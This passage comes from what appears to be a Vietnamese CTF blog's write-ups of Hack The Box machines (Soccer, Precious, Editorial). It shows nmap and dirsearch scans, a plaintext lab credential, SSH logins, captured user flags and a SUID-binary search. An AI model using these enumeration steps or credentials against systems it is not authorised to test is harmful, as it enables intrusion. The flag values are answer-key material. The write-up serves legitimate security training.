SF:tions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCo
SF:ntent-Length:\x20139\r\nDate:\x20Wed,\x2025\x20Sep\x202024\x2005:13:55\
SF:x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang
SF:=\&quot;en\&quot;&gt;\n&lt;head&gt;\n&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/
SF:head&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20GET\x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&quot;)%r(HT
SF:TPOptions,16C,&quot;HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Pol
SF:icy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\
SF:r\nDate:\x20Wed,\x2025\x20Sep\x202024\x2005:13:55\x20GMT\r\nConnection:
SF:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\&quot;en\&quot;&gt;\n&lt;head&gt;\n&lt;me
SF:ta\x20charset=\&quot;utf-8\&quot;&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;pre&gt;C
SF:annot\x20OPTIONS\x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&quot;)%r(RTSPRequest,16C,&quot;HT
SF:TP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-s
SF:rc\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20
SF:text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Wed,\
SF:x2025\x20Sep\x202024\x2005:13:55\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\&quot;en\&quot;&gt;\n&lt;head&gt;\n&lt;meta\x20charset=\&quot;u
SF:tf-8\&quot;&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20OPTIONS\
SF:x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&quot;)%r(RPCCheck,2F,&quot;HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nConnection:\x20close\r\n\r\n&quot;)%r(DNSVersionBindReqTCP,2F
SF:,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n&quot;)%
SF:r(DNSStatusRequestTCP,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnect
SF:ion:\x20close\r\n\r\n&quot;)%r(Help,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nConnection:\x20close\r\n\r\n&quot;)%r(SSLSessionReq,2F,&quot;HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n&quot;);
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.95 seconds
l3mnt2010@ASUSEXPERTBOOK:~$
</code></pre><p>ở đây ta có thể thấy có 3 port được mở là 22, 80 và 9091 có vẻ là 1 dịch vụ <code>xmltec-xmlmail</code></p>
<h3 id="80http">80/http</h3>
<p>Đang chạy service nginx 1.18.0 trên ubuntu</p>
<p><img src="https://hackmd.io/_uploads/HJefpzZR0.png" alt="image"></p>
<p>Vào thì ta thấy một trang web</p>
<pre><code>l3mnt2010@ASUSEXPERTBOOK:~$ dirsearch -u &quot;http://soccer.htb/&quot; -f

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 24987

Output File: /home/l3mnt2010/.dirsearch/reports/soccer.htb/-_24-09-25_12-18-25.txt

Error Log: /home/l3mnt2010/.dirsearch/logs/errors-24-09-25_12-18-25.log

Target: http://soccer.htb/

[12:18:25] Starting:
[12:18:28] 403 -  564B  - /.ht_wsr.txt
[12:18:28] 403 -  564B  - /.htaccess.bak1
[12:18:28] 403 -  564B  - /.htaccess.sample
[12:18:28] 403 -  564B  - /.htpasswd_test
[12:18:29] 403 -  564B  - /.htpasswds
[12:18:29] 403 -  564B  - /.httr-oauth
[12:18:29] 403 -  564B  - /.htaccess_orig
[12:18:29] 403 -  564B  - /.htaccess_sc
[12:18:29] 403 -  564B  - /.html
[12:18:29] 403 -  564B  - /.htm
[12:18:29] 403 -  564B  - /.htaccessOLD
[12:18:29] 403 -  564B  - /.htaccessBAK
[12:18:29] 403 -  564B  - /.htaccess.save
[12:18:29] 403 -  564B  - /.htaccessOLD2
[12:18:29] 403 -  564B  - /.htaccess.orig
[12:18:29] 403 -  564B  - /.htaccess_extra
[12:18:59] 403 -  564B  - /admin/.htaccess
[12:19:11] 403 -  564B  - /administrator/.htaccess
[12:19:16] 403 -  564B  - /app/.htaccess
[12:19:49] 200 -    7KB - /index.html

Task Completed
</code></pre><p>Ta thấy trang chỉ có mỗi trang html này -&gt; khả năng là phải đi tìm sub domain</p>
<pre><code> cat /etc/hosts
127.0.0.1       localhost       soccer  soccer.htb      soc-player.soccer.htb

127.0.1.1       ubuntu-focal    ubuntu-focal
</code></pre><pre><code>player
PlayerOftheMatch2022
</code></pre><pre><code> ssh player@10.129.9.9
The authenticity of host '10.129.9.9 (10.129.9.9)' can't be established.
ED25519 key fingerprint is SHA256:PxRZkGxbqpmtATcgie2b7E8Sj3pw1L5jMEqe77Ob3FE.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? SHA256:PxRZkGxbqpmtATcgie2b7E8Sj3pw1L5jMEqe77Ob3FE
Warning: Permanently added '10.129.9.9' (ED25519) to the list of known hosts.
player@10.129.9.9's password:
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Sep 25 14:45:13 UTC 2024

  System load:           1.32
  Usage of /:            70.1% of 3.84GB
  Memory usage:          20%
  Swap usage:            0%
  Processes:             228
  Users logged in:       1
  IPv4 address for eth0: 10.129.9.9
  IPv6 address for eth0: dead:beef::250:56ff:feb9:c67b

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Sep 25 14:44:39 2024 from 10.10.14.47
player@soccer:~$ ls
user.txt
player@soccer:~$ cat user.txt
9c4772a0da09d9d8a66cfa83424aee20
player@soccer:~$

</code></pre><p>user flag: <code>9c4772a0da09d9d8a66cfa83424aee20</code></p>
<pre><code>player@soccer:~$ find / -perm -u=s -type f 2&gt;/dev/null
/usr/local/bin/doas
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/at
/snap/snapd/17883/usr/lib/snapd/snap-confine
/snap/core20/1695/usr/bin/chfn
/snap/core20/1695/usr/bin/chsh
/snap/core20/1695/usr/bin/gpasswd
/snap/core20/1695/usr/bin/mount
/snap/core20/1695/usr/bin/newgrp
/snap/core20/1695/usr/bin/passwd
/snap/core20/1695/usr/bin/su
/snap/core20/1695/usr/bin/sudo
/snap/core20/1695/usr/bin/umount
/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1695/usr/lib/openssh/ssh-keysign
player@soccer:~$ ls -la /usr/local/bin/doas
-rwsr-xr-x 1 root root 42224 Nov 17  2022 /usr/local/bin/doas
player@soccer:~$ ls -la /usr/local/bin/doas/
ls: cannot access '/usr/local/bin/doas/': Not a directory
player@soccer:~$ ls -la /usr/local/bin/doas
-rwsr-xr-x 1 root root 42224 Nov 17  2022 /usr/local/bin/doas
player@soccer:~$ ls -la /usr/local/etc/doas.conf

</code></pre><h2 id="precious">Precious</h2>
<pre><code>l3mnt2010@ASUSEXPERTBOOK:~$ nmap -sV 10.129.228.98
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-29 21:48 +07
Nmap scan report for 10.129.228.98
Host is up (0.058s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre><p>Sau đó ta có thể thấy được là chall đang mở 2 port đó là 22 và 80 là 2 service ssh và http đang chạy phiên bản nginx 1.18.0</p>
<p>Vì chưa có thông tin của ssh nên ta sẽ khai thác từ cổng 80 trước -&gt; cơ bản thì cổng này đang host 1 dịch vụ web với ngôn ngữ ruby với nginx server -&gt; chức năng là ta sẽ submit 1 url và trang sẽ convert qua file pdf</p>
<p>Sau khi t</p>
<h2 id="editorial">Editorial</h2>
<pre><code>l3mnt2010@ASUSEXPERTBOOK:~/HTB/machine/easy$ nmap -A -sV -T4 -vvv 10.129.25.133 -oN nmap.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-18 12:53 +07
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:53
Completed NSE at 12:53, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:53
Completed NSE at 12:53, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:53
Completed NSE at 12:53, 0.00s elapsed
Initiating Ping Scan at 12:53
Scanning 10.129.25.133 [2 ports]
Completed Ping Scan at 12:53, 0.08s elapsed (1 total hosts)
Initiating Connect Scan at 12:53
Scanning editorial.htb (10.129.25.133) [1000 ports]
Discovered open port 22/tcp on 10.129.25.133
Discovered open port 80/tcp on 10.129.25.133
Increasing send delay for 10.129.25.133 from 0 to 5 due to 17 out of 41 dropped probes since last increase.
Completed Connect Scan at 12:53, 14.12s elapsed (1000 total ports)
Initiating Service scan at 12:53
Scanning 2 services on editorial.htb (10.129.25.133)
Completed Service scan at 12:53, 6.31s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.25.133.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:53
Completed NSE at 12:53, 4.62s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:53
Completed NSE at 12:53, 0.69s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:53
Completed NSE at 12:53, 0.00s elapsed
Nmap scan report for editorial.htb (10.129.25.133)
Host is up, received syn-ack (0.16s latency).
Scanned at 2024-07-18 12:53:27 +07 for 26s
Not shown: 998 closed ports
Reason: 998 conn-refused
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET OPTIONS HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Editorial Tiempo Arriba
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:53
Completed NSE at 12:53, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:53
Completed NSE at 12:53, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:53
Completed NSE at 12:53, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.71 seconds
l3mnt2010@ASUSEXPERTBOOK:~/HTB/machine/easy$
</code></pre><pre><code>l3mnt2010@ASUSEXPERTBOOK:~$ ssh dev@10.129.25.133
dev@10.129.25.133's password:
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Jul 18 06:41:37 AM UTC 2024

  System load:           0.08
  Usage of /:            60.5% of 6.35GB
  Memory usage:          12%
  Swap usage:            0%
  Processes:             224
  Users logged in:       0
  IPv4 address for eth0: 10.129.25.133
  IPv6 address for eth0: dead:beef::250:56ff:feb9:8ccb


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Jun 10 09:11:03 2024 from 10.10.14.52
dev@editorial:~$ ls
apps  user.txt
dev@editorial:~$ cat user.txt
64c89c804232a31a3b175d789e414b38
dev@editorial:~$
</code></pre><p>user.txt</p>
<p>flag user: <code>64c89c804232a31a3b175d789e414b38</code></p>


        
          <div class="blog-tags">
            
              
              <a href="https://l3mnt2010.github.io/tags/ctf/">CTF</a>&nbsp;
            
              
              <a href="https://l3mnt2010.github.io/tags/vietnamese/">Vietnamese</a>&nbsp;
            
          </div>
        

        

        
      </article>

      
        <ul class="pager blog-pager">
          
            <li class="previous">
              <a href="https://l3mnt2010.github.io/write-up/2024-05-18-htbbusinessctf2024/" data-toggle="tooltip" data-placement="top" title="Htb business ctf 2024 the vault of hope - solved challenges in time">&larr; Previous Post</a>
            </li>
          
          
            <li class="next">
              <a href="https://l3mnt2010.github.io/write-up/2024-06-23-googlectf2024/" data-toggle="tooltip" data-placement="top" title="Google CTF 2024 - solved &#39;s challenges on time">Next Post &rarr;</a>
            </li>
          
        </ul>
      


      

    </div>
  </div>
</div>

      <footer>
  <div class="container">
    
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center footer-links">
          
          
        </ul>
        <p class="credits copyright text-muted">
          

          &nbsp;&bull;&nbsp;&copy;
          
            0001
          

          
            &nbsp;&bull;&nbsp;
            <a href="https://l3mnt2010.github.io/">&gt; root@l3mnt2010:~# ./exploit.py</a>
          
        </p>
        
        <p class="credits theme-by text-muted">
          <a href="https://gohugo.io">Hugo v0.83.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
          
        </p>
      </div>
    </div>
  </div>
</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>

<script src="https://l3mnt2010.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://l3mnt2010.github.io/js/load-photoswipe.js"></script>










    
  </body>
</html>

